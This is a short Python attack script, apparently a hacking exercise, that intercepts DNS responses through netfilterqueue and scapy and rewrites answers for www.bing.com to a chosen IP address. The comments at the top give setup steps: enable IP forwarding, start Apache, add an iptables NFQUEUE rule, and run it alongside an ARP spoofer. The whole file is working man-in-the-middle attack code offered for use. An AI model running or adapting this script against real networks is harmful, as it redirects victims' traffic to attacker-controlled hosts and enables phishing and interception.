#!/usr/bin/env python
#How to run:
	#0. run		echo 1 > /proc/sys/net/ipv4/ip_forward
	#1. service apache2 start
	#2. iptables -I FORWARD -j NFQUEUE --queue-num 0
	#3. run 	python spoofer.py
	#4. run 	python DNS_spoof.py


import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		if "www.bing.com" in qname:
			print("[+] Spoofing target")
			answer = scapy.DNSRR(rrname=qname, rdata="216.239.38.120")
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].chksum
			del scapy_packet[scapy.UDP].len

			packet.set_payload(str(scapy_packet))
	
	packet.accept() #packet.drop() 



queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

